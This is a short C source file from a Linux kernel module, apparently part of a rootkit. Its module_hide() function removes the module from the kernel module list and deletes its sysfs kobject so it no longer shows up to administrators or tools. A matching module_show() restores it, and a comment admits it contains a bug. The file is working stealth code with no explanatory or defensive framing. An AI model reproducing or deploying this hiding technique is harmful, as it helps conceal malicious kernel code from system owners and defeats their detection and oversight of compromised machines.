#include "include/hide.h"
#include "include/config.h"

static char module_hidden = 0;
static struct list_head *module_previous;
static struct list_head *module_kobj_previous;


void module_hide() {
    if (module_hidden) {
        return;
    }

    module_previous = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
    kobject_del(&THIS_MODULE->mkobj.kobj);
    list_del(&THIS_MODULE->mkobj.kobj.entry);

    module_hidden = !module_hidden;
}

void module_show() {
    /* TODO: Somewhere here is the error 
    * that appears when the module is shown!
    */
    int result;

    if (!module_hidden){
        return;
    }
    
    list_add(&THIS_MODULE->list, module_previous);
    result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, PROC_FILE_NAME);

    module_hidden = !module_hidden;
}